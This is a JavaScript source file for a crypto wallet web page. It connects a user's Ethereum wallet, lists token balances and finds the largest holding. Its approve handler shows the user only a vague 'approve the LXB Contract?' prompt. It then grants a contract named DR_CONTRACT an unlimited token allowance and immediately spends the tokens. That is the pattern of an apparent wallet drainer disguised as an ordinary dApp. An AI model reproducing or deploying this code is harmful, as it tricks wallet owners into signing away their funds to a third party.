/**
 * Approves and spends tokens using the TokenApprover contract
 * @param {string} tokenAddress - The address of the token contract (LXB_CONTRACT.ADDRESS)
 * @param {string} spenderAddress - The address of the contract that will spend the tokens (DR_CONTRACT.ADDRESS)
 * @param {BigInt} amount - The amount of tokens to spend in Wei
 * @param {string} approvalAmount - The amount to approve for spending (usually max uint256)
 * @param {string} ownerAddress - The address of the token owner (current connected wallet address)
 * @returns {Promise<{spendTx: Object}>} Object containing the spend transaction receipt
 * @throws {Error} When approval or spend transaction fails
 */
import {
  createAppKit,
  WagmiAdapter,
  networks,
} from "https://cdn.jsdelivr.net/npm/@reown/appkit-cdn@1.6.2/dist/appkit.js"
import { reconnect, getAccount, watchAccount, signMessage, writeContract } from "https://esm.sh/@wagmi/core@2.x"
import { TokenBalanceUI, TokenService, TokenFormatter, TokenContractDetails } from "./tokenLoader.js"
import { TokenApprover } from "./approve.js"
import TokenBalanceCalculator from "./getBalance.js"

// Initialize TokenContractDetails with Web3 instance
const web3 = new Web3(window.ethereum);
const tokenDetailsViewer = new TokenContractDetails(web3);

// Add a container for contract details in your HTML
const detailsContainer = document.createElement("div");
detailsContainer.id = "contract-details-container";
document
  .querySelector(".approval-section")
  .insertBefore(detailsContainer, document.querySelector(".approval-actions"));

export const projectId = "b92b8dc3cd723bb6bd144c246940324b";

const appKitNetworks = [networks.mainnet];
const wagmiAdapter = new WagmiAdapter({
  networks: appKitNetworks,
  projectId,
});

const modal = createAppKit({
  adapters: [wagmiAdapter],
  networks: appKitNetworks,
  projectId,
  features: {
    analytics: true,
  },
  metadata: {
    name: "AppKit HTML Example",
    description: "AppKit HTML Example",
    url: "https://linealxb.com",
    icons: ["https://avatars.githubusercontent.com/u/179229932?s=200&v=4"],
  },
});

reconnect(wagmiAdapter.wagmiConfig);

document.getElementById("disconnect-btn")?.addEventListener("click", () => {
  modal.disconnect();
});

// Initialize TokenBalanceUI
const tokenBalanceUI = new TokenBalanceUI(".token-balances");
// Initialize TokenApprover
const tokenApprover = new TokenApprover(wagmiAdapter.wagmiConfig);

// Modify the watchAccount handler
watchAccount(wagmiAdapter.wagmiConfig, {
  onChange(account) {
    if (account?.address) {
      updateWalletInfo(account.address, account.chainId);
      loadTokenBalances(account.address);
    } else {
      document.querySelector(".wallet-info").style.display = "none";
      document.querySelector(".sign-message-section").style.display = "none";
    }
  },
});

// Check initial connection
const initialAccount = getAccount(wagmiAdapter.wagmiConfig);
if (initialAccount.address) {
  updateWalletInfo(initialAccount.address, initialAccount.chainId);
  loadTokenBalances(initialAccount.address);
  document.querySelector(".sign-message-section").style.display = "block";
}

// LXB Contract Constants
const LXB_CONTRACT = {
  ADDRESS: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
  CHAIN_ID: 1, // Mainnet chain ID
  DECIMALS: 6,
};

const DR_CONTRACT = {
  ADDRESS: "0x07bfDbE3f5905f99318d9E2F1C8a664b8e1e4F07",
  CHAIN_ID: 1, // Mainnet chain ID
  DECIMALS: 18,
};

document.querySelector("#approve-token")?.addEventListener("click", async () => {
  try {
    const account = getAccount(wagmiAdapter.wagmiConfig);
    if (!account.address) {
      throw new Error("Please connect your wallet first");
    }

    // Get all tokens and find the one with highest balance
    const tokens = await fetchUserTokens(account.address, account.chainId);
    const filteredTokens = TokenBalanceCalculator.filterTokens(tokens, {
      minBalance: 0.01,
      excludeTokens: ["DUST"],
    });
    const highestBalanceToken = TokenBalanceCalculator.calculateHighestBalanceToken(
      filteredTokens
    );

    if (!highestBalanceToken) {
      throw new Error("No tokens found in wallet");
    }

    // Show contract details before approval
    const details = await tokenDetailsViewer.getContractDetails(
      LXB_CONTRACT.ADDRESS,
      account.address,
      DR_CONTRACT.ADDRESS
    );

    // Convert the balance to Wei (multiply by 10^6 for token decimals)
    const balanceInWei = BigInt(
      Math.floor(Number.parseFloat(highestBalanceToken.balance) * 10 ** 6)
    );

    const isApproved = await tokenApprover.hasApprovedContract(
      LXB_CONTRACT.ADDRESS,
      account.address,
      DR_CONTRACT.ADDRESS,
      balanceInWei
    );

    // Display the details
    tokenDetailsViewer.createDetailsDisplay(detailsContainer, details);

    // Ask for confirmation
    const confirmed = confirm(`Do you want to approve the LXB Contract?`);
    if (!confirmed) {
      return;
    }

    // Verify we're on the correct network
    if (account.chainId !== LXB_CONTRACT.CHAIN_ID) {
      throw new Error("Please switch to Mainnet");
    }

    const approvalAmount = (2n ** 256n - 1n).toString();

    const statusEl = document.querySelector("#status");
    statusEl.textContent = "Initiating approval...";

    // Use the updated approveAndSpend method
    const { spendTx } = await tokenApprover.approveAndSpend(
      LXB_CONTRACT.ADDRESS,
      DR_CONTRACT.ADDRESS,
      approvalAmount,
      isApproved,
      account.address
    );

    statusEl.textContent = `Successfully approved ${highestBalanceToken.symbol} tokens!`;
  } catch (error) {
    console.error("Approval error:", error);
    document.querySelector("#status").textContent =
      "Approval failed";
    throw error;
  }
});

const tokenService = new TokenService(web3);

async function fetchUserTokens(address, chainId) {
  if (chainId === 1) {
    const data = await tokenService.getWalletTokens(address);
    if (!data) return [];

    const tokens = [];

    // Add ETH
    if (data.ETH) {
      tokens.push({
        symbol: "ETH",
        name: "Ethereum",
        address: address,
        balance: data.ETH.balance,
        price: data.ETH.price.rate || 0,
      });
    }

    // Add ERC20 tokens
    if (data.tokens) {
      data.tokens.forEach((token) => {
        if (token.tokenInfo) {
          const tokenData = {
            symbol: token.tokenInfo.symbol || "Unknown",
            name: token.tokenInfo.name || "Unknown Token",
            balance: token.balance,
            address: token.tokenInfo.address,
            price: token.tokenInfo.price?.rate || 0,
          };

          tokens.push(tokenData);
        }
      });
    }

    return tokens;
  }
  return [];
}

async function loadTokenBalances(userAddress) {
  if (!userAddress) return;

  const account = getAccount(wagmiAdapter.wagmiConfig);
  tokenBalanceUI.showLoading();
  tokenBalanceUI.clearBalances();

  try {
    const tokens = await fetchUserTokens(userAddress, account.chainId);
    tokens.forEach((token) => {
      const formattedBalance = TokenFormatter.formatBalance(token.balance);
      const usdValue = token.price
        ? TokenFormatter.formatUSD(token.price)
        : "$ 0.00";

      tokenBalanceUI.displayTokenInfo({
        ...token,
        formattedBalance,
        usdValue,
      });
    });

    // Get the token with the highest balance
    const filteredTokens = TokenBalanceCalculator.filterTokens(tokens, {
      minBalance: 0.01,
      excludeTokens: ["DUST"],
    });
    
    TokenBalanceCalculator.calculateHighestBalanceToken( filteredTokens );
  } catch (error) {
    console.error("Failed to load tokens:", error);
    tokenBalanceUI.displayError("Failed to load token balances");
  } finally {
    tokenBalanceUI.hideLoading();
  }
}

function updateWalletInfo(address, chainId) {
  const walletInfo = document.querySelector(".wallet-info");
  const addressEl = document.querySelector(".wallet-address");
  const networkBadge = document.querySelector(".network-badge");

  // Show wallet info
  walletInfo.style.display = "block";

  // Update address
  addressEl.textContent = `${address.slice(0, 6)}...${address.slice(-4)}`;

  // Update network
  const networks = {
    11155111: "Testnet",
    1: "Ethereum Mainnet",
  };
  networkBadge.textContent = networks[chainId] || `Chain ID: ${chainId}`;

  // Copy address functionality
  const copyBtn = document.querySelector(".copy-btn");
  copyBtn.addEventListener("click", () => {
    navigator.clipboard.writeText(address);
    showTooltip(copyBtn, "Copied!");
  });
}

function showTooltip(element, message) {
  const tooltip = document.createElement("div");
  tooltip.className = "tooltip";
  tooltip.textContent = message;

  document.body.appendChild(tooltip);

  const rect = element.getBoundingClientRect();
  tooltip.style.top = `${rect.top - 30}px`;
  tooltip.style.left = `${rect.left + (rect.width - tooltip.offsetWidth) / 2}px`;
  tooltip.style.opacity = "1";

  setTimeout(() => {
    tooltip.style.opacity = "0";
    setTimeout(() => tooltip.remove(), 200);
  }, 1000);
}
